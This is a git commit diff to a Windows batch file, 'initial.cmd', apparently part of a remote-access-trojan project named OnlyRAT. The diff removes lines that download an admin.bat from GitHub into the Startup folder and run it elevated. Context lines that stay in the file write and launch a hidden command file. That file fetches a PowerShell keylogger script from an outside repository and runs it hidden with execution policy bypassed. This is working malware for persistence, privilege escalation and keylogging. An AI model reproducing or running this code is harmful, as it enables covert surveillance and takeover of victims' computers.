96dad17fdf4018e4efa4a04c7b74c18a072c7912
sayuru99 <saurudealwis@ymail.com>
2024-09-23 20:54:48 +0530

    ss

--- initial.cmd
+++ initial.cmd
@@ -13,11 +13,6 @@ set "startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 cd /d "%startup%"
 
-assoc .ps1=Microsoft.PowerShellScript.1
-ftype Microsoft.PowerShellScript.1="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe" "%1"
-
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%startup%\admin.bat')"
-powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"
 
 echo powershell -c "Invoke-WebRequest -Uri 'https://github.com/lak200425/dododo/blob/daf08c77b8bb7f83a190398f48f1745d0f65f13c/key.ps1' -OutFile 'keylogg.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden" > down.cmd
 powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\down.cmd\"' -WindowStyle Hidden"
